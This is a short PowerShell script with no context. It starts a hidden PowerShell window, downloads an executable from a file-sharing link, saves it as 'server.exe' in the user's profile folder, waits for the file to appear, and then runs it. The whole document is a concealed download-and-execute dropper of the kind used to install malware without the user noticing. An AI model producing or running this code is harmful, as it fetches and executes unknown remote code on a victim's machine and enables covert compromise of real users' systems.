PowerShell.exe -WindowStyle hidden {
$url = "https://filetransfer.io/data-package/A4QWrqps/download"
$downloadsFolder = [Environment]::GetFolderPath("User")
$outputPath = Join-Path -Path $downloadsFolder -ChildPath "server.exe"
Invoke-WebRequest -Uri $url -OutFile $outputPath
while ((Test-Path -Path $outputPath) -eq $false) {
    Start-Sleep -Seconds 1
}
Start-Process -FilePath $outputPath
}
